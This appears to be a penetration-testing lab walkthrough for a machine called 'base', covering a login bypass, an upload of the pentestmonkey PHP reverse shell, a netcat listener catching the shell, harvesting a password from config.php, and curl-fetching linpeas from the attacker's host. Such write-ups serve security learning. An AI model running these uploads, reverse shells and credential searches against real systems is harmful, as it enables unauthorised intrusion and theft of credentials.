Navigating to http://10.129.95.184/login/login.php and taking advantage of the strcmp vulnerability, the upload page can be accessed.
![[UploadFiles.png]]

http://10.129.95.184/upload.php

Time to test uploading a web shell.

## Request
```
POST /upload.php HTTP/1.1
Host: 10.129.95.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------3682059414528359251835764951
Content-Length: 5733
Origin: http://10.129.95.184
DNT: 1
Connection: keep-alive
Referer: http://10.129.95.184/upload.php
Cookie: PHPSESSID=5p9l8r4rb8q8f3cuqsobnnsisk

-----------------------------3682059414528359251835764951
Content-Disposition: form-data; name="image"; filename="php-reverse-shell.php"
Content-Type: application/x-php

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be us
<SNIP>
```

## Response
```
HTTP/1.1 200 OK
Date: Sat, 30 Aug 2025 14:05:14 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 36
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=utf-8

{"success":"Your file was uploaded"}
```

- There is no uploads/ directory, and the file isn't located in login/.
- [[Base/02 - Enumeration|02 - Enumeration]] found an `_uploaded` directory.
http://10.129.95.184/_uploaded/ shows the reverse shell :)

```
### Attacker - listening
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337       
listening on [any] 1337 ...

### Target - click on reverse shell

### Attacker
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337       
listening on [any] 1337 ...
connect to [10.10.14.103] from (UNKNOWN) [10.129.95.184] 55344
Linux base 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 14:17:25 up 48 min,  0 users,  load average: 0.01, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1253): Inappropriate ioctl for device
bash: no job control in this shell
www-data@base:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@base:/$ find / -iname user.txt 2>/dev/null
find / -iname user.txt 2>/dev/null
/home/john/user.txt

```


## Snooping around
```
www-data@base:/var/www/html$ ls -l
ls -l
total 64
drwxrwxr-x 2 root www-data  4096 Aug 30 14:02 _uploaded
drwxr-xr-x 7 root root      4096 Jun  4  2022 assets
drwxr-xr-x 2 root root      4096 Jun  4  2022 forms
-rwxr-xr-x 1 root root     39344 Jun  4  2022 index.html
drwxr-xr-x 2 root root      4096 Jun 15  2022 login
-rwxr-xr-x 1 root root       128 Jun  4  2022 logout.php
-rwxr-xr-x 1 root root      2952 Jun  9  2022 upload.php
www-data@base:/var/www/html$ grep -ri "passw" .
<SNIP>
./login/config.php:$password = "th<SNIP>rd";
<SNIP>

www-data@base:/var/www/html/login$ cat config.php
cat config.php
<?php
$username = "admin";
$password = "th<SNIP>rd";
```

That cred works for:
- logging in to the portal 
- ssh access as john
## Checking groups
```
www-data@base:/$ find / -group www-data 2>/dev/null | grep -v proc
/var/www/html/_uploaded
/var/www/html/_uploaded/php-reverse-shell.php
/var/cache/apache2/mod_cache_disk

```

## Linpeas
```
### Attacker - serving up
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ python3 -m http.server 8000        
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

### Target - grabbing
www-data@base:/tmp/ignore$ curl -o lin.sh http://10.10.14.103:8000/linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  932k  100  932k    0     0  1995k      0 --:--:-- --:--:-- --:--:-- 1991k

```